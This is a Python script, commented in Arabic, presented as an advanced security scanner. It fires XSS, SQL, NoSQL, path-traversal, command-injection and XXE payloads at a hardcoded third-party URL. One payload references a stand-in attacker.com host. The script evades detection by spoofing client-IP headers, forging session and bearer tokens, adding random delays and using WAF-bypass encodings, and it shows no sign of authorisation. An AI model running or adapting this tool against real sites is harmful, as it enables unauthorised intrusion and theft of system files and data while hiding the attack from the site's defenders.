#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
الفاحص الأمني المتقدم - Advanced Security Scanner v2.0
"""

import requests
import random
import time
import json
import base64
import urllib.parse
import html
import re
from datetime import datetime
import threading
import os

class AdvancedSecurityScannerV2:
    """فاحص أمني متقدم مع مميزات جديدة"""
    
    def __init__(self):
        requests.packages.urllib3.disable_warnings()
        self.lock = threading.Lock()
        
        # قوائم الحمولات المتقدمة
        self.payloads = {
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<body onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<svg/onload=alert('XSS')>",
                "<img src=# onerror=alert('XSS')>",
                "<math><mtext><script>alert('XSS')</script></mtext></math>"
            ],
            'sql': [
                "' OR '1'='1",
                "' OR 1=1--",
                "admin'--",
                "1' OR '1'='1",
                "1' UNION SELECT null--",
                "1' UNION SELECT null,null--",
                "1' UNION SELECT null,null,null--",
                "1' AND (SELECT * FROM users WHERE username='admin')--",
                "1' AND LENGTH(database())>0--",
                "1' UNION SELECT @@version,2,3--"
            ],
            'lfi': [
                "../../../../etc/passwd",
                "../../../etc/passwd",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "php://filter/convert.base64-encode/resource=index.php",
                "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
                "expect://id",
                "file:///etc/passwd",
                "zip://test.zip#test.txt",
                "compress.bzip2://test.bz2"
            ],
            'command': [
                "; id",
                "| id",
                "&& id",
                "$(id)",
                "`id`",
                "; cat /etc/passwd",
                "| cat /etc/passwd",
                "&& cat /etc/passwd",
                "$(cat /etc/passwd)",
                "; system('id')"
            ],
            'xxe': [
                '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe.xml">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>'
            ],
            'nosql': [
                '{"$ne": null}',
                '{"$gt": ""}',
                '{"$regex": ".*"}',
                '{"$where": "this.password.length > 0"}',
                '{"username": {"$ne": null}, "password": {"$ne": null}}',
                '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}',
                '{"$or": [{"username": "admin"}, {"username": "admin"}]}',
                '{"username": {"$exists": true}}',
                '{"password": {"$exists": true}}',
                '{"$and": [{"username": "admin"}, {"password": {"$ne": ""}}]}'
            ]
        }
        
        # مؤشرات الاستجابة
        self.response_indicators = {
            'xss': ['alert(', 'javascript:', 'onerror=', 'onload=', 'onfocus=', 'onclick=', 'eval(', 'document.write'],
            'sql': ['mysql_fetch_array', 'ORA-', 'Microsoft OLE DB Provider', 'SQLServer JDBC Driver', 'PostgreSQL query failed', 'syntax error', 'unexpected token'],
            'lfi': ['root:x:', 'daemon:x:', 'bin:x:', 'sys:x:', 'nobody:x:', 'for 16-bit app support', '[fonts]', '[extensions]'],
            'command': ['uid=', 'gid=', 'groups=', 'whoami', 'root', 'administrator', 'nt authority', 'system32'],
            'xxe': ['file://', 'http://', 'ENTITY', 'DOCTYPE', 'SYSTEM', '&xxe;', 'xmlParseEntityDecl'],
            'nosql': ['MongoDB', 'CouchDB', 'RethinkDB', 'NoSQL', 'document', 'collection', 'database']
        }

    def generate_advanced_headers(self, stealth_level=3):
        """إنشاء هيدرات متقدمة"""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0"
        ]
        
        headers = {
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
        if stealth_level >= 2:
            headers.update({
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'X-Real-IP': f"{random.randint(10,100)}.{random.randint(10,100)}.{random.randint(10,100)}.{random.randint(10,100)}",
                'X-Originating-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'X-Remote-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'X-Client-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            })
        
        if stealth_level >= 3:
            headers.update({
                'Referer': f"https://www.google.com/search?q={random.choice(['login', 'admin', 'test', 'search'])}",
                'Origin': f"https://{random.choice(['google.com', 'bing.com', 'yahoo.com'])}",
                'X-Requested-With': 'XMLHttpRequest',
                'X-HTTP-Method-Override': random.choice(['GET', 'POST', 'PUT', 'DELETE'])
            })
        
        if stealth_level >= 4:
            headers.update({
                'Cookie': f"session={base64.b64encode(str(random.randint(1,1000000)).encode()).decode()}; path=/; HttpOnly; Secure",
                'Authorization': f"Bearer {base64.b64encode(f'user{random.randint(1,1000)}:password{random.randint(1,1000)}'.encode()).decode()}",
                'X-CSRF-Token': base64.b64encode(str(random.randint(1,1000000)).encode()).decode()
            })
        
        return headers

    def apply_bypass_technique(self, payload, technique):
        """تطبيق تقنية تخطي WAF"""
        if technique == 'url_encode':
            return urllib.parse.quote(payload)
        elif technique == 'double_encode':
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif technique == 'mixed_case':
            return ''.join(random.choice([c.upper(), c.lower()]) for c in payload)
        elif technique == 'comment_injection':
            comments = ['/**/', '/*test*/', '--', '#']
            comment = random.choice(comments)
            return payload.replace(' ', f' {comment} ')
        elif technique == 'null_byte':
            return payload + '%00'
        elif technique == 'http_parameter_pollution':
            return f"{payload}&input={payload}&test={payload}"
        else:
            return payload

    def analyze_response(self, response, scan_type, payload):
        """تحليل الاستجابة للكشف عن الثغرات"""
        vulnerability_score = 0
        indicators_found = []
        
        # تحليل رمز الحالة
        if response.status_code in [200, 201, 202]:
            vulnerability_score += 1
        elif response.status_code in [403, 406, 409]:
            vulnerability_score += 2
        elif response.status_code in [500, 502, 503]:
            vulnerability_score += 3
        
        # فحص مؤشرات الثغرات
        response_text = response.text.lower()
        
        if scan_type in self.response_indicators:
            for indicator in self.response_indicators[scan_type]:
                if indicator.lower() in response_text:
                    indicators_found.append(indicator)
                    vulnerability_score += 2
        
        # فحص أخطاء قاعدة البيانات
        db_errors = ['mysql_fetch_array', 'mysqli_query', 'pg_query', 'microsoft ole db provider', 'syntax error', 'unexpected token']
        for error in db_errors:
            if error in response_text:
                indicators_found.append(f"DB_ERROR: {error}")
                vulnerability_score += 2
        
        # فحص ملفات النظام
        system_files = ['root:x:', 'daemon:x:', 'bin:x:', 'sys:x:', 'nobody:x:', 'for 16-bit app support']
        for file_content in system_files:
            if file_content in response_text:
                indicators_found.append(f"SYSTEM_FILE: {file_content}")
                vulnerability_score += 3
        
        # فحص تنفيذ الأوامر
        command_indicators = ['uid=', 'gid=', 'groups=', 'whoami', 'root@', 'administrator@']
        for cmd_indicator in command_indicators:
            if cmd_indicator in response_text:
                indicators_found.append(f"COMMAND_EXEC: {cmd_indicator}")
                vulnerability_score += 3
        
        is_vulnerable = vulnerability_score >= 3
        
        return {
            'vulnerable': is_vulnerable,
            'score': vulnerability_score,
            'indicators': indicators_found,
            'status_code': response.status_code,
            'response_length': len(response.text),
            'response_time': response.elapsed.total_seconds()
        }

    def test_payload_with_bypass(self, target_url, payload, scan_type, headers, bypass_technique=None):
        """اختبار حمولة مع تقنية تخطي"""
        try:
            # تطبيق تقنية التخطي
            if bypass_technique:
                payload = self.apply_bypass_technique(payload, bypass_technique)
            
            # إنشاء URL الاختبار
            test_url = f"{target_url}?input={payload}"
            
            # تنفيذ الطلب
            response = requests.get(test_url, headers=headers, verify=False, timeout=15)
            
            # تحليل الاستجابة
            analysis = self.analyze_response(response, scan_type, payload)
            
            return {
                'payload': payload,
                'scan_type': scan_type,
                'bypass_technique': bypass_technique,
                'vulnerable': analysis['vulnerable'],
                'vulnerability_score': analysis['score'],
                'indicators': analysis['indicators'],
                'status_code': analysis['status_code'],
                'response_length': analysis['response_length'],
                'response_time': analysis['response_time'],
                'timestamp': datetime.now().isoformat()
            }
            
        except Exception as e:
            return {
                'payload': payload,
                'scan_type': scan_type,
                'bypass_technique': bypass_technique,
                'vulnerable': False,
                'error': str(e),
                'timestamp': datetime.now().isoformat()
            }

    def scan_target_advanced(self, target_url, scan_type='all', stealth_level=4, enable_bypass=True):
        """فحص متقدم للهدف"""
        
        print(f"🚀 الفاحص الأمني المتقدم v2.0")
        print(f"🎯 الهدف: {target_url}")
        print(f"🔍 نوع الفحص: {scan_type}")
        print(f"🛡️ مستوى التخفي: {stealth_level}")
        print(f"🔄 تقنيات التخطي: {'مفعلة' if enable_bypass else 'معطلة'}")
        print("=" * 80)
        
        start_time = time.time()
        
        # إعداد النتائج
        results = {
            'target': target_url,
            'scan_type': scan_type,
            'stealth_level': stealth_level,
            'enable_bypass': enable_bypass,
            'start_time': datetime.now().isoformat(),
            'vulnerabilities': {},
            'statistics': {}
        }
        
        # تحديد أنواع الفحص
        if scan_type == 'all':
            scan_types = list(self.payloads.keys())
        else:
            scan_types = [scan_type]
        
        total_tests = 0
        total_vulnerabilities = 0
        bypass_successful = 0
        
        for scan_t in scan_types:
            print(f"\n🔍 بدء فحص {scan_t.upper()}...")
            
            if scan_t not in self.payloads:
                continue
                
            scan_results = []
            payloads = self.payloads[scan_t]
            
            for i, payload in enumerate(payloads, 1):
                print(f"  📡 اختبار {i}/{len(payloads)}: {payload[:50]}...")
                
                # تأخير عشوائي
                time.sleep(random.uniform(0.5, 1.5))
                
                # اختبار الحمولة الأساسية
                headers = self.generate_advanced_headers(stealth_level)
                result = self.test_payload_with_bypass(target_url, payload, scan_t, headers)
                scan_results.append(result)
                
                total_tests += 1
                if result['vulnerable']:
                    total_vulnerabilities += 1
                    print(f"    ✅ تم اكتشاف ثغرة! (النتيجة: {result['vulnerability_score']})")
                else:
                    print(f"    ❌ لم يتم اكتشاف ثغرة")
                
                # اختبار تقنيات التخطي
                if enable_bypass and stealth_level >= 3:
                    bypass_techniques = ['url_encode', 'mixed_case', 'comment_injection', 'null_byte']
                    
                    for technique in bypass_techniques:
                        print(f"    🔄 اختبار تقنية التخطي: {technique}")
                        time.sleep(random.uniform(0.3, 1.0))
                        
                        bypass_result = self.test_payload_with_bypass(
                            target_url, payload, scan_t, headers, technique
                        )
                        scan_results.append(bypass_result)
                        
                        total_tests += 1
                        if bypass_result['vulnerable']:
                            total_vulnerabilities += 1
                            bypass_successful += 1
                            print(f"      🎯 تم اكتشاف ثغرة باستخدام {technique}!")
                        else:
                            print(f"      ❌ فشلت تقنية {technique}")
            
            results['vulnerabilities'][scan_t] = scan_results
        
        # إحصائيات نهائية
        end_time = time.time()
        results['statistics'] = {
            'total_tests': total_tests,
            'total_vulnerabilities': total_vulnerabilities,
            'bypass_successful': bypass_successful,
            'success_rate': (total_vulnerabilities / total_tests * 100) if total_tests > 0 else 0,
            'bypass_success_rate': (bypass_successful / total_tests * 100) if total_tests > 0 else 0,
            'scan_duration': end_time - start_time
        }
        
        results['end_time'] = datetime.now().isoformat()
        
        # عرض الملخص
        print("\n" + "=" * 80)
        print("📊 ملخص الفحص الأمني المتقدم v2.0:")
        print("=" * 80)
        print(f"✅ إجمالي الاختبارات: {total_tests}")
        print(f"⚠️ الثغرات المكتشفة: {total_vulnerabilities}")
        print(f"📈 نسبة النجاح: {results['statistics']['success_rate']:.1f}%")
        print(f"🎯 تقنيات التخطي الناجحة: {bypass_successful}")
        print(f"🔄 نسبة نجاح التخطي: {results['statistics']['bypass_success_rate']:.1f}%")
        print(f"⏱️ مدة الفحص: {results['statistics']['scan_duration']:.2f} ثانية")
        
        # تفصيل الثغرات
        print(f"\n📋 تفصيل الثغرات:")
        for scan_type, vuln_results in results['vulnerabilities'].items():
            vulnerable_count = sum(1 for r in vuln_results if r['vulnerable'])
            if vulnerable_count > 0:
                print(f"  🔴 {scan_type.upper()}: {vulnerable_count} ثغرة")
        
        return results

    def generate_html_report_v2(self, results, filename=None):
        """إنشاء تقرير HTML متقدم"""
        
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"advanced_scan_report_v2_{timestamp}.html"
        
        html_content = f"""
        <!DOCTYPE html>
        <html lang="ar" dir="rtl">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>تقرير الفحص الأمني المتقدم v2.0</title>
            <style>
                body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 20px; background-color: #f5f5f5; }}
                .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.1); }}
                .header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; border-radius: 10px; margin-bottom: 20px; }}
                .stats-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }}
                .stat-card {{ background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; }}
                .stat-number {{ font-size: 2em; font-weight: bold; color: #333; }}
                .stat-label {{ color: #666; margin-top: 5px; }}
                .vulnerability-card {{ background: #fff; border-left: 4px solid #e74c3c; padding: 15px; margin: 10px 0; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }}
                .safe-card {{ background: #fff; border-left: 4px solid #27ae60; padding: 15px; margin: 10px 0; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }}
                .bypass-success {{ background: #d4edda; border: 1px solid #c3e6cb; color: #155724; }}
                .footer {{ text-align: center; margin-top: 40px; padding: 20px; color: #666; border-top: 1px solid #eee; }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>🛡️ تقرير الفحص الأمني المتقدم v2.0</h1>
                    <p>الهدف: {results['target']}</p>
                    <p>تاريخ الفحص: {results['start_time']}</p>
                    <p>مدة الفحص: {results['statistics']['scan_duration']:.2f} ثانية</p>
                </div>
                
                <div class="stats-grid">
                    <div class="stat-card">
                        <div class="stat-number">{results['statistics']['total_tests']}</div>
                        <div class="stat-label">إجمالي الاختبارات</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number" style="color: #e74c3c;">{results['statistics']['total_vulnerabilities']}</div>
                        <div class="stat-label">الثغرات المكتشفة</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number" style="color: #f39c12;">{results['statistics']['success_rate']:.1f}%</div>
                        <div class="stat-label">نسبة النجاح</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">{results['statistics']['bypass_successful']}</div>
                        <div class="stat-label">تقنيات التخطي الناجحة</div>
                    </div>
                </div>
        """
        
        # إضافة تفاصيل الثغرات
        for scan_type, vuln_results in results['vulnerabilities'].items():
            vulnerable_results = [r for r in vuln_results if r['vulnerable']]
            
            if vulnerable_results:
                html_content += f"""
                <h2>🔴 ثغرات {scan_type.upper()}</h2>
                <p>تم اكتشاف {len(vulnerable_results)} ثغرة من نوع {scan_type.upper()}</p>
                """
                
                for result in vulnerable_results[:5]:  # أول 5 نتائج فقط
                    html_content += f"""
                    <div class="vulnerability-card">
                        <h4>الحمولة: {html.escape(result['payload'][:100])}</h4>
                        <p><strong>النتيجة:</strong> <span style="color: #e74c3c;">مكتشفة</span></p>
                        <p><strong>النتيجة:</strong> {result['vulnerability_score']}/10</p>
                        <p><strong>رمز الاستجابة:</strong> {result['status_code']}</p>
                        <p><strong>طول الاستجابة:</strong> {result['response_length']} حرف</p>
                        <p><strong>وقت الاستجابة:</strong> {result['response_time']:.2f} ثانية</p>
                        
                        {f'<div class="bypass-success"><strong>تقنية التخطي:</strong> {result["bypass_technique"]}</div>' if result.get('bypass_technique') else ''}
                    </div>
                    """
        
        # Footer
        html_content += f"""
                <div class="footer">
                    <p>تم إنشاء هذا التقرير بواسطة الفاحص الأمني المتقدم v2.0</p>
                    <p>تاريخ الإنشاء: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
                </div>
            </div>
        </body>
        </html>
        """
        
        # حفظ الملف
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        print(f"📄 تم إنشاء تقرير HTML: {filename}")
        return filename

    def save_json_report(self, results, filename=None):
        """حفظ التقرير بتنسيق JSON"""
        
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"advanced_scan_report_v2_{timestamp}.json"
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(results, f, ensure_ascii=False, indent=2)
        
        print(f"📄 تم حفظ التقرير JSON: {filename}")
        return filename

def main():
    """الدالة الرئيسية"""
    
    print("🚀 الفاحص الأمني المتقدم v2.0")
    print("=" * 80)
    
    # إنشاء الماسح
    scanner = AdvancedSecurityScannerV2()
    
    # إعدادات الفحص
    target_url = "https://dxp.salam.sa/test.php"
    scan_type = "all"  # all, xss, sql, lfi, command, xxe, nosql
    stealth_level = 4  # 1-5
    enable_bypass = True
    
    try:
        # تنفيذ الفحص
        results = scanner.scan_target_advanced(
            target_url, 
            scan_type, 
            stealth_level, 
            enable_bypass
        )
        
        # حفظ التقارير
        json_report = scanner.save_json_report(results)
        html_report = scanner.generate_html_report_v2(results)
        
        print(f"\n✅ اكتمل الفحص بنجاح!")
        print(f"📋 تقرير JSON: {json_report}")
        print(f"🌐 تقرير HTML: {html_report}")
        
        # فتح التقرير HTML في المتصفح
        import webbrowser
        webbrowser.open(f'file://{os.path.abspath(html_report)}')
        
    except KeyboardInterrupt:
        print(f"\n⚠️ تم إيقاف الفحص بواسطة المستخدم")
    except Exception as e:
        print(f"❌ خطأ أثناء الفحص: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()